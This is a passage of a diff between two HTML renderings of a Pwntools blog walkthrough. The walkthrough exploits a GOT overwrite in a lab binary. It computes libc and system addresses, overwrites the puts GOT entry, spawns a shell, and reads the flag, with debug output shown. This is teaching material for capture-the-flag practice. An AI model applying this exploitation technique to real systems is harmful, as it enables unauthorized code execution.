 <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>got_puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>puts</span>
 <span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc == </span><span class=si>%#x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span>
@@ -221,10 +398,19 @@ libc.so.6────────┼──────────────�
 <span class=c1># Calculate system()</span>
 <span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>system</span>
 <span class=n>info</span><span class=p>(</span><span class=s2>&#34;system == </span><span class=si>%#x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>system</span><span class=p>)</span>
-</code></pre></div><p>All that&rsquo;s left to do is to send the address of <code>system</code> which is read by the second call to <code>read</code> at</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>30
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c>    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>message</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
-</code></pre></td></tr></table></div></div><p>And we can use <code>io.pack</code> to automatically convert it from an integer to a packed 32-bit value.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=n>io</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
-</code></pre></div><p>The overwrite effectively replaces the GOT pointer for <code>puts</code> with <code>system</code>. Note that &ldquo;leak&rdquo; is now &ldquo;write 4&rdquo;.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>  record                                            
+</code></pre></div><p>All that&rsquo;s left to do is to send the address of <code>system</code> which is read by the second call to <code>read</code> at</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>30
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c>    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>message</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And we can use <code>io.pack</code> to automatically convert it from an integer to a packed 32-bit value.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>io</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
+</code></pre></div><p>The overwrite effectively replaces the GOT pointer for <code>puts</code> with <code>system</code>. Note that &ldquo;leak&rdquo; is now &ldquo;write 4&rdquo;.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>  record                                            
 ┌─────────┐                                         
 │         │                Global Offset Table      
 │         │             ┌───────────────────────┐   
@@ -253,13 +439,18 @@ libc.so.6───────────────────────�
 │              └───────┘                     │      
 └────────────────────────────────────────────┘      
 
-</code></pre></div><h3 id=getting-a-shell>Getting a Shell</h3><p>Finally, we can get a shell after clearing any unnecesssary output and spawn a shell. With the shell, we can send any command we want, so we just dump the flag file.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># Have an interactive shell to get the flag</span>
+</code></pre></div><h3 id=getting-a-shell>Getting a Shell</h3>
+<p>Finally, we can get a shell after clearing any unnecesssary output and spawn a shell. With the shell, we can send any command we want, so we just dump the flag file.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># Have an interactive shell to get the flag</span>
 <span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
 <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>)</span>
 <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
-</code></pre></div><p>Alternately, we can use <code>io.interactive()</code> to have a truly interactive shell and issue whatever commands we want!</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
+</code></pre></div><p>Alternately, we can use <code>io.interactive()</code> to have a truly interactive shell and issue whatever commands we want!</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
 <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</code></pre></div><h3 id=bringing-it-all-together>Bringing it All Together</h3><p>If we run our exploit script with <code>DEBUG</code> (e.g. <code>python3 exploit.py DEBUG</code>) we can view all of the traffic that is sent back and forth between our exploit script and the target pwnable.</p><pre>
+</code></pre></div><h3 id=bringing-it-all-together>Bringing it All Together</h3>
+<p>If we run our exploit script with <code>DEBUG</code> (e.g. <code>python3 exploit.py DEBUG</code>) we can view all of the traffic that is sent back and forth between our exploit script and the target pwnable.</p>
+<pre>
 [<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] &apos;/home/pwntools/pwntools/got-overwrite/got&apos;
     Arch:     i386-32-little
     RELRO:    <span style=color:#cd0000>No RELRO</span>
@@ -302,16 +493,76 @@ puts&#64;got is at  0x80498b4
 [<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:red>DEBUG</span>] Received 0x17 bytes:
     b&apos;Flag{This_Is_The_Flag}\n&apos;
 [<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#0f0>+</span>] Flag{This_Is_The_Flag}
-</pre><div class=blog-tags><a href=https://blog.pwntools.com//tags/got/>got</a>&nbsp;
+</pre>
+<div class=blog-tags>
+<a href=https://blog.pwntools.com//tags/got/>got</a>&nbsp;
 <a href=https://blog.pwntools.com//tags/aslr/>aslr</a>&nbsp;
 <a href=https://blog.pwntools.com//tags/easy/>easy</a>&nbsp;
 <a href=https://blog.pwntools.com//tags/elf/>elf</a>&nbsp;
-<a href=https://blog.pwntools.com//tags/libc/>libc</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://blog.pwntools.com/posts/pwnable-kr-fd/ data-toggle=tooltip data-placement=top title="Pwnable.kr: fd">&larr; Previous Post</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://github.com/Gallopsled/pwntools#readme title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://twitter.com/Pwntools title=Twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://discord.gg/96VA2zvjCB title=Discord><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-discord fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://github.com/Gallopsled>Team Gallopsled</a>
+<a href=https://blog.pwntools.com//tags/libc/>libc</a>&nbsp;
+</div>
+</article>
+<ul class="pager blog-pager">
+<li class=previous>
+<a href=https://blog.pwntools.com/posts/pwnable-kr-fd/ data-toggle=tooltip data-placement=top title="Pwnable.kr: fd">&larr; Previous Post</a>
+</li>
+<li class=next>
+<a href=https://blog.pwntools.com/posts/dctf-2021-hotel-rop-ret2libc-pie/ data-toggle=tooltip data-placement=top title="dCTF 2021 - Hotel ROP">Next Post &rarr;</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<footer>
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<ul class="list-inline text-center footer-links">
+<li>
+<a href=https://github.com/Gallopsled/pwntools#readme title=GitHub>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://twitter.com/Pwntools title=Twitter>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://discord.gg/96VA2zvjCB title=Discord>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-discord fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+</ul>
+<p class="credits copyright text-muted">
+<a href=https://github.com/Gallopsled>Team Gallopsled</a>
 &nbsp;&bull;&nbsp;&copy;
 2021
 All Rights Reserved
 &nbsp;&bull;&nbsp;
-<a href=https://blog.pwntools.com/>Pwntools Blog</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.82.1</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script><script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script><script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/load-photoswipe.js></script><script>(function(){var c='a6e761131baa51ced',a=document.createElement('script'),b;a.type='text/javascript',a.async=!0,a.src='https://cse.google.com/cse.js?cx='+c,b=document.getElementsByTagName('script')[0],b.parentNode.insertBefore(a,b)})()</script></body></html>
+<a href=https://blog.pwntools.com/>Pwntools Blog</a>
+</p>
+<p class="credits theme-by text-muted">
+<a href=https://gohugo.io>Hugo v0.88.1</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
+</p>
+</div>
+</div>
+</div>
+</footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script>
+<script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script>
+<script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
+<script src=https://blog.pwntools.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/load-photoswipe.js></script>
+<script>(function(){var c='a6e761131baa51ced',a=document.createElement('script'),b;a.type='text/javascript',a.async=!0,a.src='https://cse.google.com/cse.js?cx='+c,b=document.getElementsByTagName('script')[0],b.parentNode.insertBefore(a,b)})()</script>
+</body>
+</html>
